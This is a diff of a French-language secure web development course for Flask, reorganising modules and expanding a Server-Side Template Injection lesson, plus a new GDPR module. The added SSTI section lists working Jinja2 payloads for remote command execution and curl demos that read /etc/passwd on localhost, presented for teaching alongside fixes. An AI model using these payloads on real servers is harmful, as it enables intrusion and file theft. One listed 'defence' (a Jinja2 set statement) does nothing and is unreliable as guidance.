@@ -438,12 +438,10 @@ def get_order(public_id):
 
 ---
 
-## Module 2.3 - Mass Assignment et autres vulnérabilités (30 min)
+## Module 2.3 - Mass Assignment (15 min)
 
 > **Objectifs** — À l'issue de ce module, vous serez capables de :
 > - Identifier une vulnérabilité de mass assignment et la corriger avec une allowlist ou un schéma Pydantic avec `extra = 'forbid'`
-> - Reconnaître un point d'injection SSTI dans un template Jinja2 et appliquer la correction
-> - Expliquer le risque ReDoS et appliquer les techniques de mitigation (re2, limitation de taille d'input)
 
 ### 2.3.1 Mass Assignment
 
@@ -556,124 +554,149 @@ def update_user(user_id):
     return jsonify(user.to_dict())
 ```
 
-### 2.3.2 Server-Side Template Injection (SSTI)
+> **À retenir**
+> - **Mass assignment** : ne jamais passer `request.form.to_dict()` directement à un constructeur de modèle — toujours utiliser une allowlist ou un schéma avec `extra = 'forbid'`.
 
-**Principe** : injection dans un template côté serveur, peut mener à du RCE.
+---
+
+## Module 2.4 - Server-Side Template Injection (SSTI) (20 min)
+
+> **Objectifs** — À l'issue de ce module, vous serez capables de :
+> - Reconnaître un point d'injection SSTI dans un template Jinja2
+> - Exploiter une SSTI pour atteindre le RCE complet
+> - Implémenter la protection : templates statiques et variables passées en arguments
+
+### 2.4.1 Principe de la vulnérabilité
+
+**Injection dans un template côté serveur** : si une variable utilisateur est insérée directement dans un template (via concaténation de chaîne), l'attaquant peut injecter du code Jinja2 qui sera exécuté sur le serveur.
 
 ```python
-# 🚨 VULNÉRABLE - Jinja2 SSTI
+# 🚨 VULNÉRABLE - Concaténation dans render_template_string()
 from flask import render_template_string
 
 @app.route('/hello')
 def hello():
     name = request.args.get('name', 'World')
-    template = f"<h1>Hello {name}</h1>"  # Concaténation dans template !
+    template = f"<h1>Hello {name}</h1>"  # ← Concaténation = template variable
     return render_template_string(template)
+
+# Attaque : /hello?name={{7*7}}
+# → Affiche "<h1>Hello 49</h1>" car {{ 7*7 }} est évalué par Jinja2
 ```
 
-**Exploitation** :
+**Différence SSTI ↔ XSS** :
+- XSS : exécution de JavaScript dans le navigateur
+- SSTI : exécution de code Python/Jinja2 sur le serveur ← **plus grave**
+
+### 2.4.2 Exploitation — Du RCE complet
+
+**Détection** :
+```
+http://localhost:5000/hello?name={{7*7}}
+→ Réponse : "Hello 49" → SSTI confirmée ✅
+```
+
+**Escalade vers le RCE** :
 
 ```python
-# Payloads SSTI Jinja2
 payloads = [
-    # Détection
-    "{{7*7}}",                    # Affiche 49 si vulnérable
-    "{{config}}",                 # Fuite de configuration Flask
-
-    # RCE complet
+    # Fuite de configuration Flask
+    "{{ config }}",
+    
+    # Accès aux variables globales de Python
     "{{ ''.__class__.__mro__[1].__subclasses__() }}",
+    
+    # Exécution de commandes système via os.popen()
     "{{ cycler.__init__.__globals__.os.popen('id').read() }}",
+    
+    # Accès aux __builtins__ pour importer des modules
     "{{ request.application.__globals__.__builtins__.__import__('os').popen('whoami').read() }}",
+    
+    # Variante courte (souvent plus simple)
+    "{{ self.__init__.__globals__.__builtins__.__import__('os').system('touch /tmp/pwned') }}",
 ]
 ```
 
-**Protection** :
+**Démo d'exploitation** :
+```bash
+# Créer un fichier sur le serveur
+curl "http://localhost:5000/hello?name={{ self.__init__.__globals__.__builtins__.__import__('os').system('touch /tmp/pwned') }}"
+
+# Afficher le contenu d'un fichier
+curl "http://localhost:5000/hello?name={{ ''.__class__.__mro__[1].__subclasses__()[434].__init__.__globals__['popen']('cat /etc/passwd').read() }}"
+```
+
+### 2.4.3 Protection — Trois règles essentielles
+
+**Règle 1 : Templates statiques — jamais de concaténation**
 
 ```python
-# ✅ SÉCURISÉ - Variables passées au template
-@app.route('/hello')
-def hello():
-    name = request.args.get('name', 'World')
-    # Le template est statique, name est une variable échappée
-    return render_template_string("<h1>Hello {{ name }}</h1>", name=name)
+# ❌ DANGEREUX
+template = f"<h1>Hello {user_input}</h1>"
+return render_template_string(template)
 
-# ✅ ENCORE MIEUX - Templates dans des fichiers
+# ✅ SÛR
+return render_template_string("<h1>Hello {{ name }}</h1>", name=user_input)
+```
+
+**Règle 2 : Jinja2 auto-escape par défaut**
+
+```python
+# ✅ Par défaut, Jinja2 échappe les variables HTML
+# {{ "<script>" }} → &lt;script&gt;
+# Mais SSTI passe la validation : {{ ''.__class__ }} s'exécute toujours
+```
+
+**Règle 3 : Utiliser des fichiers de template, pas render_template_string()**
+
+```python
+# ✅ MEILLEUR
 @app.route('/hello')
 def hello():
     name = request.args.get('name', 'World')
     return render_template('hello.html', name=name)
+
+# Fichier : templates/hello.html
+# <h1>Hello {{ name }}</h1>
 ```
 
-### 2.3.3 ReDoS (Regular Expression Denial of Service)
+**Défense en profondeur** :
 
-**Principe** : certaines regex ont une complexité exponentielle sur des inputs spécifiques.
-
-```python
-# 🚨 VULNÉRABLE - Regex avec backtracking catastrophique
-import re
-
-EMAIL_REGEX = re.compile(r'^([a-zA-Z0-9]+)+@example\.com$')
-
-# Cette validation peut prendre plusieurs minutes !
-def is_valid_email(email):
-    return bool(EMAIL_REGEX.match(email))
-
-# Attaque : input crafté
-malicious_input = "a" * 30 + "!"  # Cause un backtracking exponentiel
+1. **Désactiver les builtin dangereux** (si possible)
+```jinja2
+{% set allowed_vars = {'config': false, '__class__': false} %}
 ```
 
-**Protections** :
-
+2. **Filtrer avec un schéma** (Pydantic, Marshmallow)
 ```python
-# ✅ SÉCURISÉ - Bibliothèque re2 (linear time)
-import re2 as re  # Drop-in replacement sans backtracking
+from pydantic import BaseModel, constr
 
-# ✅ SÉCURISÉ - Timeout sur regex
-import signal
+class HelloSchema(BaseModel):
+    name: constr(max_length=100, regex=r'^[a-zA-Z0-9 ]+$')  # Alphanumériques uniquement
 
-class RegexTimeout(Exception):
-    pass
+try:
+    data = HelloSchema(name=request.args.get('name'))
+except ValidationError:
+    return "Invalid name", 400
+```
 
-def with_timeout(seconds):
-    def handler(signum, frame):
-        raise RegexTimeout()
-    signal.signal(signal.SIGALRM, handler)
-    signal.alarm(seconds)
+3. **Utiliser une sandbox** (très restrictive)
+```python
+from jinja2.sandbox import SandboxedEnvironment
 
-def safe_regex_match(pattern, text, timeout=1):
-    try:
-        with_timeout(timeout)
-        result = re.match(pattern, text)
-        signal.alarm(0)
-        return result
-    except RegexTimeout:
-        return None
-
-# ✅ SÉCURISÉ - Limitation de taille d'input
-def is_valid_email(email):
-    if len(email) > 254:  # RFC 5321
-        return False
-    return bool(EMAIL_REGEX.match(email))
-
-# ✅ MIEUX - Validation simple sans regex complexe
-from email_validator import validate_email, EmailNotValidError
-
-def is_valid_email(email):
-    try:
-        validate_email(email)
-        return True
-    except EmailNotValidError:
-        return False
+env = SandboxedEnvironment()
+template = env.from_string("{{ user_input }}")  # Exécution sécurisée
 ```
 
 > **À retenir**
-> - **Mass assignment** : ne jamais passer `request.form.to_dict()` directement à un constructeur de modèle — toujours utiliser une allowlist ou un schéma avec `extra = 'forbid'`.
-> - **SSTI** : `render_template_string(f"...{user_input}...")` est aussi dangereux que `eval()`. Les templates doivent être statiques ; les données passées en arguments séparés.
-> - **ReDoS** : tester les regex appliquées à des entrées utilisateur avec des inputs conçus pour déclencher le backtracking. Une limite de taille d'input est le filet de sécurité minimal.
+> - **SSTI** = `render_template_string(f"...{user_input}...")` = **RCE complet**
+> - Les templates doivent être statiques ; **jamais de concaténation** avec une variable utilisateur
+> - Jinja2 auto-escape protège contre XSS dans les templates, **pas contre SSTI**
+> - CWE-1336 (SSTI), OWASP A03 (Injection)
 
 ---
 
-## Module 2.4 - Authentification sécurisée (45 min)
+## Module 2.5 - Authentification sécurisée (45 min)
 
 > **Objectifs** — À l'issue de ce module, vous serez capables de :
 > - Classer les algorithmes de hashage de mots de passe du moins au plus sécurisé et justifier le choix d'Argon2
@@ -1026,7 +1049,7 @@ def verify_mfa_setup():
 
 ---
 
-## Module 2.5 - Sessions, cookies et headers (30 min)
+## Module 2.6 - Sessions, cookies et headers (30 min)
 
 > **Objectifs** — À l'issue de ce module, vous serez capables de :
 > - Configurer des cookies de session sécurisés (Secure, HttpOnly, SameSite, durée limitée)
@@ -1199,7 +1222,7 @@ def add_security_headers(response):
 
 ---
 
-## Module 2.6 - Protection anti-bot et rate limiting (25 min)
+## Module 2.7 - Protection anti-bot et rate limiting (25 min)
 
 > **Objectifs** — À l'issue de ce module, vous serez capables de :
 > - Configurer Flask-Limiter avec des seuils adaptés selon la sensibilité des endpoints
@@ -1391,7 +1414,7 @@ class AnomalyDetector:
 
 ---
 
-## Module 2.7 - Plan de sécurité applicative (20 min)
+## Module 2.8 - Plan de sécurité applicative (20 min)
 
 > **Objectifs** — À l'issue de ce module, vous serez capables de :
 > - Décrire les quatre phases d'un SDLC sécurisé et nommer les outils associés à chaque phase
@@ -1541,7 +1564,7 @@ repos:
 
 ---
 
-## Module 2.8 - Référentiel OWASP API Security Top 10 (15 min)
+## Module 2.9 - Référentiel OWASP API Security Top 10 (15 min)
 
 > **Objectifs** — À l'issue de ce module, vous serez capables de :
 > - Mettre en correspondance les catégories OWASP Web Top 10 et OWASP API Top 10
@@ -1679,6 +1702,89 @@ Focalisé sur les API : appels massifs, patterns d'abus, anomalies de tokens.
 > - **BOLA** (API1) est la vulnérabilité la plus fréquente en API : vérifier systématiquement la propriété ou le rôle avant de retourner tout objet.
 > - **Excessive Data Exposure** (API3) : ne jamais retourner le modèle complet — définir des DTOs explicites avec les champs strictement nécessaires.
 > - Une interface Swagger/OpenAPI exposée sans authentification en production est une cartographie complète de l'API offerte à l'attaquant.
+
+---
+
+## Module 2.10 - Conformité RGPD et implications techniques (15 min)
+
+> **Objectif** — Mettre en perspective toutes les vulnérabilités étudiées en Séance 1 et 2 avec leurs impacts RGPD et les obligations légales associées.
+
+### 2.9.1 Synthèse : vulnérabilités et impacts RGPD
+
+Le RGPD impose la protection dès la conception et l'intégrité des données. Chaque vulnérabilité compromet au minimum deux piliers : **confidentialité** (Article 5(1)(f)) et souvent la **disponibilité** ou l'**intégrité**.
+
+**Matrice vulnérabilité → impact RGPD → obligation légale** :
+
+| Vulnérabilité | Impact | Article RGPD | Sanction type |
+|---|---|---|---|
+| #1, #2 — SQL Injection | Fuite de données personnelles (BDD compromise) | Art. 32, Art. 5(1)(f) | 4% CA ou 20M€ |
+| #3, #4, #5 — XSS | Exfiltration de sessions → accès non autorisé aux données | Art. 5(1)(f), Art. 32 | Notification CNIL + 3–7% CA |
+| #6 — CSRF | Modification non autorisée de données, suppression de consentements | Art. 5(1)(d), Art. 7 | 3–4% CA |
+| #7 — IDOR | Énumération + accès à dossiers d'autres utilisateurs | Art. 5(1)(a), Art. 32 | Notification + sanctions |
+| #8 — Mass Assignment | Escalade de privilèges → accès aux rôles admin | Art. 32 | 4% CA |
+| #9 — SSTI (RCE) | Accès complet au serveur, vol de secrets API | Art. 32, Art. 33 | 4% CA + responsabilité pénale |
+| #10 — Path Traversal | Accès à fichiers sensibles (config, clés, données PII) | Art. 32, Art. 5(1)(f) | 3–4% CA |
+| #11 — Command Injection | RCE, accès système complet | Art. 32 | 4% CA |
+| #12 — Hashage MD5 | Mots de passe cassables → accès utilisateurs | Art. 32 (mesures « appropriées ») | 3% CA |
+| #13 — Cookies non sécurisés | Usurpation de session, vol de jetons | Art. 5(1)(f), Art. 32 | Notification + 2–3% CA |
+| #14 — Absence Rate Limiting | Énumération de comptes, bruteforce | Art. 32 (sécurité) | 2% CA |
+| #15 — Headers absents | Surface d'attaque élargie, attaques navigateur non bloquées | Art. 25 (Privacy by Design) | 2–3% CA |
+
+### 2.9.2 Obligations en cas de violation
+
+**Détection → Évaluation → Notification (72h)**
+
+```
+Détection d'une fuite ou compromission
+    ↓
+Évaluation du risque pour les droits des personnes
+    ↓
+Oui, risque probable → Notification CNIL sous 72h
+                    → Notification personnes concernées sous 3j si risque élevé
+                    → Documentation : cause racine, données compromises, mesures correctives
+    ↓
+Non → Enregistrement en registre des violations (audit trail interne)
+```
+
+**Sanctions graduées par gravité** :
+
+- **Infraction mineure** (notification tardive, documentation incomplète) : jusqu'à 2% du CA
+- **Infraction grave** (données sensibles compromise, pas de chiffrement) : jusqu'à 4% du CA
+- **Cas exceptionnels** (données biométriques, santé, art. 9) : jusqu'à 4% CA + amende pénale
+
+### 2.9.3 Intégration du RGPD en Security by Design
+
+**Couches de protection** :
+
+1. **Minimisation** : ne stocker que les champs nécessaires
+   - Exemple : âge au lieu de date de naissance complète
+   - Bénéfice : moins de données volées en cas de fuite
+
+2. **Chiffrement au repos** : `AES-256-GCM` pour données sensibles
+   - Exemple : tokens de session, clés privées (KMS)
+   - Bénéfice : fuite ≠ compromission (clés de déchiffrement ailleurs)
+
+3. **Accès restreint** : RBAC strict, audit trail
+   - Exemple : seul un admin peut accéder aux données médicales
+   - Bénéfice : traçabilité complète en cas de violation
+
+4. **Durée de rétention** : suppression automatique après délai
+   - Exemple : logs d'accès archivés après 90 jours
+   - Bénéfice : réduction de la fenêtre d'exposition
+
+5. **Chiffrement en transit** : TLS 1.2+ obligatoire
+   - Exemple : Cookie `Secure` + `SameSite`
+   - Bénéfice : sniffing/MITM bloqués
+
+6. **Audit et traçabilité** : logs structurés + alertes
+   - Exemple : accès anormal à données sensibles → alerte
+   - Bénéfice : détection précoce des attaques
+
+> **À retenir**
+> - Chaque vulnérabilité **peut déclencher une obligation de notification CNIL** si elle expose des données personnelles.
+> - Le délai de notification est **72 heures** dès la découverte.
+> - Le RGPD s'applique à l'entreprise qui déploie l'application — la responsabilité est solidaire.
+> - Privacy by Design n'est pas un module optionnel — c'est une obligation légale intégrée dès la conception (Article 25).
 
 ---
 
@@ -1920,6 +2026,8 @@ Note : 9 vulnérabilités attendues
 → Trouver 6+ = note maximale (toutes les vulns majeures couvertes)
 → Trouver 8-9 = bonus +5 pts
 ```
+
+> **📚 Ressource d'aide** : Si vous êtes bloqué, consultez `docs/guide_correction.md` — ce guide contient des indices progressifs pour chaque vulnérabilité.
 
 ---
 
@@ -2674,6 +2782,68 @@ Pénalités :
   - Rapport < 2 pages                         : -10 pts
   - Dépôt Git absent ou non accessible        : -15 pts
   - Retard (>24h)                             : -10 pts/jour
+```
+
+> **📚 Ressource d'aide** : Si vous êtes bloqué sur une vulnérabilité, consultez `docs/guide_correction.md` — ce guide contient des indices progressifs et des solutions complètes pour les 15 vulnérabilités.
+
+---
+
+# 📚 Pour aller plus loin
+
+## ReDoS — Regular Expression Denial of Service
+
+**Concept** : Certaines expressions régulières ont une complexité exponentielle sur des inputs spécifiques, ce qui peut bloquer le serveur pendant plusieurs minutes.
+
+**Exemple de regex vulnérable** :
+
+```python
+import re
+
+# ❌ DANGEREUX - Backtracking catastrophique
+EMAIL_REGEX = re.compile(r'^([a-zA-Z0-9]+)+@example\.com$')
+
+# Cette validation peut prendre plusieurs minutes sur un input crafté
+malicious_input = "a" * 30 + "!"  # Cause un backtracking exponentiel O(2^n)
+```
+
+**Protections** :
+
+```python
+# ✅ Utiliser re2 (sans backtracking)
+import re2
+safe_regex = re2.compile(r'^([a-zA-Z0-9]+)+@example\.com$')
+
+# ✅ Ajouter un timeout
+import signal
+
+def safe_regex_match(pattern, text, timeout=1):
+    def timeout_handler(signum, frame):
+        raise TimeoutError("Regex match timeout")
+    
+    signal.signal(signal.SIGALRM, timeout_handler)
+    signal.alarm(timeout)
+    try:
+        result = re.match(pattern, text)
+        signal.alarm(0)
+        return result
+    except TimeoutError:
+        return None
+
+# ✅ Limiter la taille d'input
+def is_valid_email(email):
+    if len(email) > 254:  # RFC 5321
+        return False
+    return bool(EMAIL_REGEX.match(email))
+
+# ✅ Utiliser des validateurs spécialisés (meilleur)
+from email_validator import validate_email
+
+def is_valid_email(email):
+    try:
+        validate_email(email)
+        return True
+    except EmailNotValidError:
+        return False
 ```
 
 ---
